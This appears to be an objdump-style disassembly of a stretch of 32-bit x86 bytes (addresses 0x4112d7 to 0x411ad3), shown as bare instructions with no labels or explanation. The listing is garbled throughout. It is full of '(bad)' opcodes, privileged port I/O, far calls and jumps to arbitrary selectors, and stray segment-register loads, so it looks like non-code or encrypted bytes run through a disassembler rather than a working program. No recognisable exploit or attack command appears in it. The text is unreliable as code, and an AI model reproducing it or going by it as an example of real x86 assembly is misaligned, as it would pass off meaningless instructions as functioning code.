  4112d7:	add    cl,BYTE PTR [ecx+0x41]
  4112da:	xor    cl,dh
  4112dc:	jae    0x4112f8
  4112de:	dec    esp
  4112df:	sti    
  4112e0:	sbb    bl,BYTE PTR [ebp+0x7712b4a3]
  4112e6:	out    dx,al
  4112e7:	mov    ds:0x6bd93bd5,eax
  4112ec:	dec    ebx
  4112ed:	ficom  WORD PTR [ebp-0xa42da70]
  4112f3:	add    BYTE PTR [ecx+0x5ce4eb],ch
  4112f9:	or     eax,esp
  4112fb:	jp     0x4112eb
  4112fd:	sub    BYTE PTR [esi-0x44502e2e],0xd2
  411304:	aas    
  411305:	mov    cl,0x80
  411307:	add    bh,BYTE PTR [eax]
  411309:	mov    ds:0x49f3063,al
  41130e:	outs   dx,DWORD PTR ds:[esi]
  41130f:	dec    ebx
  411310:	push   ecx
  411311:	jo     0x41130a
  411313:	lea    ecx,[ebp-0x1c28a517]
  411319:	push   es
  41131a:	sti    
  41131b:	adc    eax,DWORD PTR [edx]
  41131d:	jl     0x411328
  41131f:	cmp    ch,BYTE PTR [ebx]
  411321:	lds    ecx,FWORD PTR ds:0x6c884637
  411327:	adc    eax,0x73c51eb5
  41132c:	jp     0x41136c
  41132e:	and    al,0x59
  411330:	sbb    eax,0x19c20cb7
  411335:	aam    0x3a
  411337:	jp     0x411306
  411339:	pop    ecx
  41133a:	and    dh,0x23
  41133d:	cmp    ah,ch
  41133f:	scas   eax,DWORD PTR es:[edi]
  411340:	add    DWORD PTR [esi+eiz*4],ecx
  411343:	mov    ecx,0xdc71f26
  411348:	arpl   WORD PTR [edi],cx
  41134a:	jl     0x41130a
  41134c:	(bad)  
  41134d:	lock and dh,BYTE PTR [ebx-0xa]
  411351:	or     dl,BYTE PTR [edi]
  411353:	push   cs
  411354:	aaa    
  411355:	cmp    ebp,0xda5f0148
  41135b:	daa    
  41135c:	xor    ah,BYTE PTR [edi+0x7c12a9f2]
  411362:	mov    bh,0xc0
  411364:	jl     0x4113d7
  411366:	jecxz  0x411322
  411368:	ins    BYTE PTR es:[edi],dx
  411369:	imul   ebp,ecx,0x554c30e0
  41136f:	push   0x3d
  411371:	and    ch,BYTE PTR [ebp+ebx*4-0x71]
  411375:	cmp    BYTE PTR [ebp+0xf7a2d40],ch
  41137b:	add    dl,BYTE PTR [edi+0x1a]
  41137e:	cmp    esp,0xfffffffc
  411381:	adc    dl,bh
  411383:	int3   
  411384:	js     0x411392
  411386:	mov    al,0xab
  411388:	push   ds
  411389:	lds    edx,FWORD PTR [ebx-0x2539031a]
  41138f:	push   0xe36c6791
  411394:	add    DWORD PTR [esp+ebp*2+0xa79b41],esp
  41139b:	push   0xbfcf9dcf
  4113a0:	push   0xca727324
  4113a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113a6:	fcomi  st,st(5)
  4113a8:	inc    esp
  4113a9:	and    DWORD PTR [ebx-0x12dc612d],esi
  4113af:	cmc    
  4113b0:	add    DWORD PTR [ebx+0x61],esi
  4113b3:	pop    ebp
  4113b4:	and    BYTE PTR [esi-0x13],bh
  4113b7:	dec    esp
  4113b8:	imul   esp,DWORD PTR [esi+eax*4-0x73],0xae6daec3
  4113c0:	inc    ebp
  4113c1:	cmp    cl,cl
  4113c3:	mov    dl,0x9f
  4113c5:	mov    ah,0xd
  4113c7:	xchg   ebx,eax
  4113c8:	dec    ebx
  4113c9:	retf   
  4113ca:	daa    
  4113cb:	pop    es
  4113cc:	pop    es
  4113cd:	and    edi,DWORD PTR [ebx+edx*1-0x3a]
  4113d1:	xchg   ecx,eax
  4113d2:	subps  xmm2,XMMWORD PTR [ecx+edx*4]
  4113d6:	mov    DWORD PTR [edi+0x73],edi
  4113d9:	add    ax,0x735
  4113dd:	ret    
  4113de:	retf   0x79b
  4113e1:	xchg   edx,eax
  4113e2:	xor    esi,esi
  4113e4:	push   ecx
  4113e6:	std    
  4113e7:	inc    ebx
  4113e8:	dec    edx
  4113e9:	sub    eax,0x18f3ccf4
  4113ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ef:	and    edi,DWORD PTR [esi-0x14]
  4113f2:	add    DWORD PTR [edx],ebp
  4113f4:	popa   
  4113f5:	jno    0x411378
  4113f7:	ds nop
  4113f9:	push   ecx
  4113fa:	mov    eax,0x5f9ce08e
  4113ff:	shl    BYTE PTR [edx+0x51],0x24
  411403:	add    dl,al
  411405:	mov    dh,0xe9
  411407:	mov    ebx,0x6ef70047
  41140c:	loope  0x41148c
  41140e:	jl     0x4113eb
  411410:	clc    
  411411:	mov    ds:0x6bb9d250,eax
  411416:	dec    esi
  411417:	push   es
  411418:	fwait
  411419:	jge    0x411416
  41141b:	push   ecx
  41141c:	pop    ss
  41141d:	in     eax,0x13
  41141f:	mov    fs,WORD PTR [edx+0x15]
  411422:	push   ecx
  411423:	cdq    
  411424:	add    al,0xde
  411426:	inc    bx
  411428:	ret    
  411429:	stc    
  41142a:	(bad)  
  41142b:	scas   eax,DWORD PTR es:[edi]
  41142c:	push   es
  41142d:	or     eax,0xa58eaff3
  411432:	pushf  
  411433:	sbb    eax,0x8f54b40f
  411438:	in     eax,dx
  411439:	mov    bl,0x38
  41143b:	mov    al,ds:0xa428455b
  411440:	xchg   esp,eax
  411441:	jne    0x4114b3
  411443:	inc    esi
  411444:	xchg   ebp,eax
  411445:	scas   eax,DWORD PTR es:[edi]
  411446:	hlt    
  411447:	adc    al,0x10
  411449:	sbb    eax,0xcad6e29a
  41144e:	mov    ch,BYTE PTR [ecx+0x2a]
  411451:	fistp  QWORD PTR [ecx]
  411453:	add    BYTE PTR [edi-0x5d],0xa2
  411457:	lods   al,BYTE PTR ds:[esi]
  411458:	out    dx,eax
  411459:	add    al,BYTE PTR [ebx+0xa03fe2d]
  41145f:	jle    0x4114ab
  411461:	mov    eax,0xce3c09fc
  411466:	or     DWORD PTR [ebp+0x68],eax
  411469:	ja     0x411435
  41146b:	(bad)  
  41146c:	test   BYTE PTR [ecx+0xbbf8df3],0x0
  411473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411474:	xor    eax,0x8b647980
  411479:	cmp    eax,0xe07870e9
  41147e:	push   esi
  41147f:	outs   dx,BYTE PTR ds:[esi]
  411480:	jbe    0x4114ec
  411482:	mov    BYTE PTR [edx+0x4a],bh
  411485:	sub    bl,cl
  411487:	xlat   BYTE PTR ds:[ebx]
  411488:	ds into 
  41148a:	ins    DWORD PTR es:[edi],dx
  41148b:	push   cs
  41148c:	pusha  
  41148d:	jl     0x411437
  41148f:	xchg   esp,eax
  411490:	mov    BYTE PTR [edi],cl
  411492:	adc    bh,BYTE PTR [edi-0x49]
  411495:	stos   BYTE PTR es:[edi],al
  411496:	mov    al,0x9
  411498:	jmp    0x411467
  41149a:	retf   
  41149b:	add    al,al
  41149d:	aam    0xe9
  41149f:	add    eax,0x5e81ddf3
  4114a4:	loope  0x4114ec
  4114a6:	add    eax,0xcf0079b1
  4114ab:	pop    ebp
  4114ac:	and    DWORD PTR [ebp+0x4808db65],0x1b
  4114b3:	fist   WORD PTR [ecx]
  4114b5:	and    BYTE PTR [esi],dl
  4114b7:	or     ecx,edi
  4114b9:	sub    eax,0xde9be6ea
  4114be:	mov    ebx,0x9e57b744
  4114c3:	repz xor eax,DWORD PTR [edi]
  4114c6:	enter  0x8aa2,0xd2
  4114ca:	adc    bl,0xb2
  4114cd:	out    0xe9,eax
  4114cf:	pop    edi
  4114d0:	icebp  
  4114d1:	out    0xd0,al
  4114d3:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4114d5:	js     0x411515
  4114d7:	dec    ecx
  4114d8:	push   eax
  4114d9:	imul   DWORD PTR [ebp-0x2]
  4114dc:	and    dh,BYTE PTR [esi-0x31]
  4114df:	ins    BYTE PTR es:[edi],dx
  4114e0:	scas   eax,DWORD PTR es:[edi]
  4114e1:	or     DWORD PTR [edi-0x6],eax
  4114e4:	fucomip st,st(0)
  4114e6:	pop    ecx
  4114e7:	bound  esi,QWORD PTR [ecx+eax*8]
  4114ea:	inc    edx
  4114eb:	jnp    0x411528
  4114ed:	stc    
  4114ee:	push   eax
  4114ef:	push   DWORD PTR [esi-0x79]
  4114f2:	shl    DWORD PTR [edx],1
  4114f4:	sbb    al,0xf8
  4114f6:	popf   
  4114f7:	mov    edx,edx
  4114f9:	popf   
  4114fa:	(bad)
  4114fe:	repnz xor eax,0x341b9ce9
  411504:	loop   0x411510
  411506:	popf   
  411507:	(bad)  
  411508:	and    edx,ecx
  41150a:	pop    ss
  41150b:	lahf   
  41150c:	jne    0x411547
  41150e:	cmp    bh,cl
  411510:	rcl    DWORD PTR [ebp-0xe1a2a1a],1
  411516:	mov    ebp,0xaa9627f9
  41151b:	adc    ebp,esp
  41151d:	add    BYTE PTR [ebx],0x33
  411520:	test   eax,0xba0e2851
  411525:	mov    ss,WORD PTR [eax-0x2b39a103]
  41152b:	and    al,0xb4
  41152d:	mov    cl,0xce
  41152f:	mov    ds:0xadfc1d50,al
  411534:	or     al,0xa2
  411536:	inc    esp
  411537:	cld    
  411538:	mov    cs,ecx
  41153a:	add    al,0x9f
  41153c:	push   edx
  41153d:	in     al,0xa5
  41153f:	or     BYTE PTR [edx+0x7],dh
  411542:	xchg   esi,edx
  411544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411545:	jo     0x411549
  411547:	push   ds
  411548:	mov    esi,0xcc556255
  41154d:	and    esi,DWORD PTR [ebx+0x7c9d9d5]
  411553:	pop    ebp
  411554:	cmp    al,0xd9
  411556:	ret    
  411557:	mov    BYTE PTR [ecx+eiz*4],0x19
  41155b:	mov    al,0xd3
  41155d:	add    al,0xcf
  41155f:	xchg   esi,eax
  411560:	push   esp
  411561:	add    BYTE PTR gs:[ebx+0x6e],dl
  411565:	or     BYTE PTR [ebx],ah
  411567:	dec    edx
  411568:	pushw  es
  41156a:	jmp    0x411508
  41156c:	jae    0x411517
  41156e:	push   eax
  41156f:	ror    DWORD PTR [esi+0x732376b5],1
  411575:	retf   
  411576:	inc    edi
  411577:	push   ss
  411578:	add    BYTE PTR [esi+0x240a55c9],bl
  41157e:	bound  esp,QWORD PTR [eax-0x16f36543]
  411584:	adc    DWORD PTR [edi+eax*4+0x3d95b2fc],ebx
  41158b:	mov    DWORD PTR [ebx+0x2f],edi
  41158e:	or     ah,dl
  411590:	xchg   edx,eax
  411591:	or     cl,bh
  411593:	mov    al,0x4f
  411595:	movq   QWORD PTR [edi],mm2
  411598:	or     eax,0x49a9554e
  41159d:	retf   
  41159e:	sub    eax,DWORD PTR [esi+0x151e96e6]
  4115a4:	cmp    DWORD PTR [ebx],eax
  4115a6:	mov    al,0xe2
  4115a8:	xchg   esp,eax
  4115a9:	shr    BYTE PTR [ebp+0x3a399a5b],1
  4115af:	sbb    eax,0x4fae006f
  4115b4:	sbb    BYTE PTR [esi+0x17],ch
  4115b7:	push   ds
  4115b8:	cmp    al,0xee
  4115ba:	fisubr DWORD PTR [ebx+0x1d]
  4115bd:	sbb    edx,DWORD PTR [edx-0x3122cf8b]
  4115c3:	call   0x9b68:0x3ca7e1e3
  4115ca:	mov    eax,ds:0xf0ccfb
  4115cf:	xlat   BYTE PTR ds:[ebx]
  4115d0:	daa    
  4115d1:	cs push esi
  4115d3:	mov    bh,0x9a
  4115d5:	(bad)  
  4115d6:	xchg   ecx,eax
  4115d7:	ins    BYTE PTR es:[edi],dx
  4115d8:	loope  0x4115e2
  4115da:	mov    cl,0xee
  4115dc:	call   0xa1ba:0xdd451b50
  4115e3:	mov    ecx,DWORD PTR [ebx+0x66]
  4115e6:	retf   
  4115e7:	xor    eax,0xcd6bab1e
  4115ec:	pusha  
  4115ed:	out    dx,al
  4115ee:	(bad)  
  4115ef:	sub    BYTE PTR ds:0x6c0f7317,bl
  4115f5:	sbb    eax,DWORD PTR [edx-0x29]
  4115f8:	ins    DWORD PTR es:[edi],dx
  4115f9:	int3   
  4115fa:	ss pop esi
  4115fc:	dec    esp
  4115fd:	iret   
  4115fe:	pop    edi
  4115ff:	jbe    0x411640
  411601:	cmp    BYTE PTR [ebx],0x5c
  411604:	push   esi
  411605:	mov    bh,0xb4
  411607:	mov    edi,0x9e051236
  41160c:	outs   dx,DWORD PTR ds:[esi]
  41160d:	sub    eax,0x7e37e589
  411612:	push   es
  411613:	retf   0xd458
  411616:	retf   0x576d
  411619:	arpl   WORD PTR [edi-0x70bc3b62],di
  41161f:	dec    eax
  411620:	fs dec esi
  411622:	repz mov esp,0xe1b96241
  411628:	addr16 out 0x3a,ax
  41162c:	cmp    eax,0x39bbb2c6
  411631:	scas   eax,DWORD PTR es:[edi]
  411632:	mov    edi,esi
  411634:	pop    esp
  411635:	scas   al,BYTE PTR es:[edi]
  411636:	or     eax,0x222d0280
  41163b:	sahf   
  41163c:	or     eax,0x69aede20
  411641:	call   0x582ee771
  411646:	arpl   WORD PTR [edi+0x18],cx
  411649:	xchg   ebx,eax
  41164a:	and    DWORD PTR [ebx+0x4840f547],ebx
  411650:	pop    edx
  411651:	push   ecx
  411652:	mov    edi,0xb71a267c
  411657:	xchg   ebx,eax
  411658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411659:	std    
  41165a:	aam    0xde
  41165c:	jne    0x4115e3
  41165e:	lahf   
  41165f:	test   BYTE PTR [eax],0xa5
  411662:	cmp    eax,0x2dd048eb
  411667:	inc    edx
  411668:	adc    al,0xa5
  41166a:	std    
  41166b:	xor    DWORD PTR [edi],ebp
  41166d:	dec    edx
  41166e:	shl    BYTE PTR [ebx],cl
  411670:	out    0xa2,al
  411672:	mov    bl,0x71
  411674:	pop    eax
  411675:	btr    DWORD PTR ds:0xa9b35605,ebx
  41167c:	shr    DWORD PTR [esi+0x763429a],0x23
  411683:	mov    ebx,0xed328975
  411688:	adc    ah,0xbe
  41168b:	mov    ah,0x63
  41168d:	fidivr DWORD PTR [ebx-0x33]
  411690:	frstor es:[edx+0x27]
  411694:	add    ch,cl
  411696:	jne    0x4116f7
  411698:	push   ecx
  411699:	ret    0x5262
  41169c:	or     bl,ah
  41169e:	mov    cl,0x2a
  4116a0:	fwait
  4116a1:	inc    edi
  4116a2:	adc    dl,0xa2
  4116a5:	mov    edx,0x310a15a1
  4116aa:	stos   BYTE PTR es:[edi],al
  4116ab:	jne    0x4116f9
  4116ad:	mov    ax,ds:0xad4fa9c2
  4116b3:	out    0xbe,eax
  4116b5:	mov    al,ds:0x7120487a
  4116ba:	fdiv   QWORD PTR [ebx-0x4]
  4116bd:	fcomp  DWORD PTR [ebp-0x1b]
  4116c0:	mov    dh,0x7b
  4116c2:	test   BYTE PTR [eax+0x219d462d],0x96
  4116c9:	in     al,dx
  4116ca:	inc    ebp
  4116cb:	hlt    
  4116cc:	mov    ebp,0x3e187203
  4116d1:	add    al,0xfb
  4116d3:	mov    ebp,0xfe8ee516
  4116d8:	test   BYTE PTR cs:0x573b0e90,al
  4116df:	sub    BYTE PTR [ebx+0x27],ch
  4116e2:	dec    ecx
  4116e3:	cmc    
  4116e4:	and    BYTE PTR [eax+0x1f],bh
  4116e7:	dec    esi
  4116e8:	cmp    al,0x29
  4116ea:	jmp    0x2fad:0xa43a97c0
  4116f1:	and    cl,BYTE PTR [eax-0x6762653b]
  4116f7:	int3   
  4116f8:	xlat   BYTE PTR ds:[ebx]
  4116f9:	es ins DWORD PTR es:[edi],dx
  4116fb:	inc    edx
  4116fc:	test   al,0xd2
  4116fe:	add    BYTE PTR [edi],bl
  411700:	into   
  411701:	xchg   ebx,eax
  411702:	mov    al,0xbc
  411704:	mov    cx,0xcad7
  411708:	fcomi  st,st(5)
  41170a:	mov    bh,0x32
  41170c:	and    BYTE PTR ss:[ecx+0x71],0x49
  411711:	data16 out 0xc7,al
  411714:	or     eax,0x43ead8df
  411719:	sub    ebp,DWORD PTR [ebx]
  41171b:	mov    ?,esp
  41171d:	xor    bh,BYTE PTR [esi]
  41171f:	ins    DWORD PTR es:[edi],dx
  411720:	lds    edi,FWORD PTR [ebx*4+0x3e14e66a]
  411727:	adc    DWORD PTR [ecx],esi
  411729:	ficom  DWORD PTR [edi]
  41172b:	mov    BYTE PTR [esi+edx*1-0x3f],ch
  41172f:	pop    ds
  411730:	inc    eax
  411731:	(bad)  
  411732:	(bad)  
  411733:	sub    eax,0xcb558868
  411738:	adc    eax,0xb9c7000
  41173d:	ins    BYTE PTR es:[edi],dx
  41173e:	fistp  WORD PTR [ecx]
  411740:	push   edx
  411741:	(bad)  
  411743:	jnp    0x411703
  411745:	mov    edx,0xfbb33c48
  41174a:	xchg   esp,eax
  41174b:	je     0x411764
  41174d:	sub    BYTE PTR [edi-0x50854444],bh
  411753:	pop    esp
  411754:	xchg   esp,eax
  411755:	sbb    al,0xa0
  411757:	inc    esi
  411758:	jmp    0x7457aa3
  41175d:	sub    edx,DWORD PTR [eax]
  41175f:	shl    ebp,0x0
  411762:	cmp    DWORD PTR cs:[edi+0x3e],ebx
  411766:	js     0x41172c
  411768:	mul    ecx
  41176a:	add    al,0x40
  41176c:	adc    ecx,DWORD PTR [ebx]
  41176e:	jle    0x4117ce
  411770:	jns    0x411790
  411772:	popf   
  411773:	pop    esp
  411774:	mov    cl,0xc2
  411776:	rol    DWORD PTR [ecx-0x31af39d8],1
  41177c:	dec    esi
  41177d:	cmc    
  41177e:	jp     0x411729
  411780:	dec    ebp
  411781:	mov    ecx,0x79c7259
  411786:	cmp    bl,BYTE PTR [esi+0x58d5b93c]
  41178c:	or     DWORD PTR [ebx+0x16dcc893],esi
  411792:	aas    
  411793:	icebp  
  411794:	jo     0x411720
  411796:	rol    esi,1
  411798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411799:	les    ebx,FWORD PTR [edx+0x75]
  41179c:	pusha  
  41179d:	nop
  41179e:	outs   dx,BYTE PTR ds:[esi]
  41179f:	adc    ebx,DWORD PTR [ebx+0x2273ead1]
  4117a5:	add    al,0x60
  4117a7:	cmp    eax,0xcc086fdc
  4117ac:	(bad)  
  4117ae:	sbb    esp,DWORD PTR [esi]
  4117b0:	outs   dx,BYTE PTR ds:[esi]
  4117b1:	mov    ss,esp
  4117b3:	sbb    DWORD PTR [ebx+edi*8-0x32],ebx
  4117b7:	jg     0x41175a
  4117b9:	or     BYTE PTR [edx],ah
  4117bb:	loopne 0x4117c0
  4117bd:	sub    eax,0xc01e2d85
  4117c2:	div    BYTE PTR [edi+0x51549366]
  4117c8:	dec    ebp
  4117c9:	(bad)  
  4117ca:	idiv   BYTE PTR [ecx-0x7d]
  4117cd:	cdq    
  4117ce:	in     eax,dx
  4117cf:	daa    
  4117d0:	fwait
  4117d1:	mov    dl,0xdb
  4117d3:	mov    edi,0x47aa959d
  4117d8:	sbb    eax,0xb277eb4d
  4117dd:	adc    cl,BYTE PTR [edi+0x14]
  4117e0:	inc    edx
  4117e1:	mov    ds:0x9b790518,eax
  4117e6:	sub    dh,BYTE PTR [ebx-0x58845640]
  4117ec:	cli    
  4117ed:	lock je 0x4117e6
  4117f0:	cmp    ch,dl
  4117f2:	loope  0x411833
  4117f4:	push   ss
  4117f5:	sbb    dl,BYTE PTR [eax+0x7e34f3f7]
  4117fb:	adc    BYTE PTR [ebx-0x5d2551ad],dh
  411801:	ss test eax,0x9ffb2373
  411807:	dec    ecx
  411808:	mov    BYTE PTR ds:0x2fec38b1,bh
  41180e:	jp     0x4117a9
  411810:	(bad)  
  411811:	xlat   BYTE PTR ds:[ebx]
  411812:	icebp  
  411813:	pop    eax
  411814:	mov    ecx,0xd7b2ead2
  411819:	mov    edx,esp
  41181b:	inc    eax
  41181c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41181d:	push   edx
  41181e:	pop    ss
  41181f:	enter  0x4b8d,0x5
  411823:	fsubr  st(6),st
  411825:	mul    BYTE PTR [edi-0x7e]
  411828:	(bad)  
  411829:	and    eax,DWORD PTR [esi]
  41182b:	stc    
  41182c:	aam    0xc1
  41182e:	test   al,0xf0
  411830:	adc    eax,0x95ce42b3
  411835:	xor    dl,ch
  411837:	dec    ebp
  411838:	sub    ebx,ebp
  41183a:	retf   0x2a4f
  41183d:	inc    ebp
  41183e:	mov    esp,0xc5ace686
  411843:	xchg   edi,eax
  411844:	js     0x411842
  411846:	or     esi,DWORD PTR [ebx+0x4a]
  411849:	mov    ebx,0x5c69cb07
  41184e:	pop    ebx
  41184f:	add    ecx,eax
  411851:	adc    DWORD PTR [edi],esp
  411853:	inc    ebp
  411854:	fstenv [esi+edi*8-0x3a]
  411859:	pop    ss
  41185a:	arpl   WORD PTR [edi],ax
  41185c:	ret    
  41185d:	adc    BYTE PTR [edi+0x32],0xba
  411861:	xchg   edi,eax
  411862:	(bad)  
  411864:	or     al,0x48
  411866:	sbb    BYTE PTR ds:0xd87b05d8,0x48
  41186d:	imul   edx,DWORD PTR [edx+0xd],0xd72131b0
  411874:	aad    0x84
  411876:	retf   
  411877:	sahf   
  411878:	lods   eax,DWORD PTR ds:[esi]
  411879:	sub    dh,BYTE PTR [ebp+0x63]
  41187c:	pop    ss
  41187d:	test   al,0xa9
  41187f:	push   cs
  411880:	inc    BYTE PTR [eax+ebx*1+0x55]
  411884:	sub    BYTE PTR [ebp+0x54],0xe7
  411888:	push   ecx
  411889:	dec    eax
  41188a:	pop    ss
  41188b:	and    eax,0xe9bb367e
  411890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411891:	and    BYTE PTR [esi-0x6959d2a2],dh
  411897:	mov    dh,0xe9
  411899:	push   esp
  41189a:	mov    ah,BYTE PTR [ecx-0x521068fe]
  4118a0:	sub    eax,esp
  4118a2:	xor    al,0x28
  4118a4:	fs push ebp
  4118a6:	pop    ecx
  4118a7:	ins    BYTE PTR es:[edi],dx
  4118a8:	in     eax,dx
  4118a9:	push   ebx
  4118aa:	sahf   
  4118ab:	repz pop ss
  4118ad:	loopne 0x411873
  4118af:	call   0x246f04c7
  4118b4:	mov    dh,0x86
  4118b6:	(bad)  
  4118b7:	jecxz  0x41187a
  4118b9:	xchg   esi,eax
  4118ba:	push   esp
  4118bb:	lahf   
  4118bc:	in     al,dx
  4118bd:	xor    ebp,DWORD PTR [ebp-0xbd7687a]
  4118c3:	dec    edi
  4118c4:	pop    edx
  4118c5:	or     al,0x3d
  4118c7:	das    
  4118c8:	xchg   ecx,eax
  4118c9:	std    
  4118ca:	add    al,0xc4
  4118cc:	cmp    eax,0x277f403d
  4118d1:	fs mov dh,0x18
  4118d4:	call   0x3c33:0x161aefd7
  4118db:	add    ebp,DWORD PTR ds:0xe52f589d
  4118e1:	(bad)  
  4118e2:	jae    0x41186f
  4118e4:	mov    edx,0x2b98d7b6
  4118e9:	mov    DWORD PTR [edi+0x2],0xc972a250
  4118f0:	push   edi
  4118f1:	(bad)  
  4118f2:	pop    esp
  4118f3:	lds    edx,FWORD PTR [esp+eax*1+0x313db391]
  4118fa:	stos   DWORD PTR es:[edi],eax
  4118fb:	xchg   BYTE PTR ds:0x24b2fece,bl
  411901:	mov    al,ds:0x26458083
  411906:	mov    bl,0x97
  411908:	dec    eax
  411909:	jae    0x411892
  41190b:	sbb    al,0x3f
  41190d:	xor    DWORD PTR ds:0xc15d7384,esi
  411913:	fimul  DWORD PTR [ebx-0x59]
  411916:	xchg   edx,eax
  411917:	xor    bl,BYTE PTR [ecx]
  411919:	lahf   
  41191a:	jge    0x41193c
  41191c:	push   ds
  41191d:	add    BYTE PTR [edi-0x588ae0c5],cl
  411923:	fwait
  411924:	arpl   WORD PTR [ebx+ecx*1+0x77],bx
  411928:	inc    eax
  411929:	jne    0x41193a
  41192b:	stos   BYTE PTR es:[edi],al
  41192c:	pop    esi
  41192d:	sub    eax,0xa8146d93
  411932:	sub    BYTE PTR [edx],ah
  411934:	push   0x41
  411936:	sar    BYTE PTR [ebp-0x4d9f62c8],1
  41193c:	inc    ebx
  41193d:	mov    eax,0x97d02b30
  411942:	mov    eax,0x67d5be10
  411947:	add    al,0x89
  411949:	clc    
  41194a:	fild   WORD PTR [esi]
  41194c:	inc    esp
  41194d:	dec    ebp
  41194e:	sub    DWORD PTR [eax-0x120b4853],0x5b
  411955:	ficom  DWORD PTR [esi+0x17cc0b8e]
  41195b:	mov    bl,0xe7
  41195d:	mov    al,ds:0x9b565192
  411962:	and    edx,ecx
  411964:	xchg   edx,eax
  411965:	dec    edx
  411966:	xchg   ebx,eax
  411967:	fs ret 
  411969:	nop
  41196a:	pop    esi
  41196b:	inc    edx
  41196c:	pop    edx
  41196d:	aad    0x1c
  41196f:	add    bl,BYTE PTR [ebx-0x20]
  411972:	jmp    0x411923
  411974:	lahf   
  411975:	mov    dh,0x9
  411977:	fbstp  TBYTE PTR [edx+ebx*4-0x668a86c5]
  41197e:	mov    ecx,0xcadcee8
  411983:	inc    ebp
  411984:	lea    eax,[edi]
  411986:	jae    0x4119a9
  411988:	cmc    
  411989:	call   WORD PTR [ebp+0x5470b4c5]
  411990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411991:	jmp    0xa808:0x9838c805
  411998:	or     al,0x8b
  41199a:	cmp    DWORD PTR [eax+0x38],esp
  41199d:	push   eax
  41199e:	inc    edi
  4119a0:	outs   dx,DWORD PTR ds:[esi]
  4119a1:	rcl    BYTE PTR [edi-0x27],0x96
  4119a5:	mov    dl,0x42
  4119a7:	xor    edx,DWORD PTR [edx]
  4119a9:	shl    DWORD PTR [ebp-0x4d],cl
  4119ac:	jmp    0x123edc1
  4119b1:	(bad)  
  4119b2:	sbb    eax,0x3f5c0f7b
  4119b7:	hlt    
  4119b8:	fcomp  DWORD PTR [edx+0x78]
  4119bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119bc:	xor    al,0x8c
  4119be:	lea    ebx,[eax-0x6b227be4]
  4119c4:	cmc    
  4119c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119c6:	adc    al,dh
  4119c8:	mov    ebx,0xeea354b3
  4119cd:	dec    esp
  4119ce:	fcmovbe st,st(4)
  4119d0:	adc    ecx,DWORD PTR [ebx]
  4119d2:	push   ds
  4119d3:	std    
  4119d4:	dec    ebp
  4119d5:	jmp    0xc7856fcf
  4119da:	je     0x4119cd
  4119dc:	retf   
  4119dd:	into   
  4119de:	pushf  
  4119df:	sar    DWORD PTR [esi],cl
  4119e1:	push   esi
  4119e2:	sub    DWORD PTR ds:0xf426a00c,0x9bda961d
  4119ec:	mov    esi,0x1ad87a6
  4119f1:	and    DWORD PTR [ecx+eiz*8+0x16a5c2ff],ebp
  4119f8:	stos   DWORD PTR es:[edi],eax
  4119f9:	jmp    0xcb78bec
  4119fe:	mov    cl,0xbc
  411a00:	mov    dl,0xae
  411a02:	out    dx,eax
  411a03:	dec    edx
  411a04:	pop    ebp
  411a05:	push   ds
  411a06:	ds jnp 0x411a16
  411a09:	xchg   esi,eax
  411a0a:	sbb    BYTE PTR [ebp+0x15],al
  411a0d:	ins    DWORD PTR es:[edi],dx
  411a0e:	pushf  
  411a0f:	mov    edx,0xa07aaa98
  411a14:	jns    0x4119a2
  411a16:	xor    BYTE PTR [ebp-0x7ab7f8f],cl
  411a1c:	xchg   ebp,eax
  411a1d:	adc    al,0x8c
  411a1f:	mov    edx,0x3f8de9c0
  411a24:	adc    eax,DWORD PTR [ebx]
  411a26:	(bad)  
  411a28:	or     ebp,ebx
  411a2a:	xchg   ebx,eax
  411a2b:	xchg   ebp,eax
  411a2c:	sbb    DWORD PTR ds:0xaef4728,esp
  411a32:	cdq    
  411a33:	mov    ebx,0xac3b0553
  411a38:	les    esp,FWORD PTR [edi+0x7c901209]
  411a3e:	mov    ch,0x3d
  411a40:	and    eax,0x11df6902
  411a45:	jmp    0xfb91:0x8c99dec0
  411a4c:	sub    BYTE PTR [ecx*1-0x247f2f76],ah
  411a53:	neg    BYTE PTR [edx-0x2a]
  411a56:	pop    edx
  411a57:	pop    esi
  411a58:	mov    edx,0x6d79da0
  411a5d:	aad    0x30
  411a5f:	cmp    ah,BYTE PTR [edx+ebx*8+0x7ba8ec17]
  411a66:	sbb    eax,0x44ef0a46
  411a6b:	stos   BYTE PTR es:[edi],al
  411a6c:	stos   BYTE PTR es:[edi],al
  411a6d:	iret   
  411a6e:	inc    esi
  411a6f:	mov    bl,0x54
  411a71:	mov    ds:0x4b2fad6b,al
  411a76:	jnp    0x411a13
  411a78:	sbb    bh,BYTE PTR [ecx-0x50f95b61]
  411a7e:	and    eax,0xd48d0c70
  411a83:	xlat   BYTE PTR ds:[ebx]
  411a84:	mov    eax,0x6951b461
  411a89:	push   edi
  411a8a:	(bad)  
  411a8b:	sub    DWORD PTR [ebx+edx*4-0x6db3d1ec],esp
  411a92:	dec    ecx
  411a93:	cmp    al,0x46
  411a95:	jg     0x411b07
  411a97:	adc    eax,0x94c851de
  411a9c:	pop    eax
  411a9d:	push   ecx
  411a9e:	push   es
  411a9f:	shl    ch,cl
  411aa1:	ss mov ecx,0x83a2f154
  411aa7:	push   es
  411aa8:	sub    BYTE PTR [esi],bh
  411aaa:	add    al,0xdd
  411aac:	in     al,dx
  411aad:	mov    esp,0xaf6673eb
  411ab2:	es add DWORD PTR ss:[edx],esi
  411ab6:	fs (bad) 
  411ab8:	cdq    
  411ab9:	lods   al,BYTE PTR ds:[esi]
  411aba:	or     BYTE PTR [edi-0x5d],ch
  411abd:	mov    edi,esp
  411abf:	adc    al,0x4c
  411ac1:	scas   eax,DWORD PTR es:[edi]
  411ac2:	adc    al,0x25
  411ac4:	setg   BYTE PTR [ebx+0x5081a1f5]
  411acb:	sub    eax,0xeaf64fdb
  411ad0:	aaa    
  411ad1:	mov    cl,0xa5
  411ad3:	jl     0x411aad
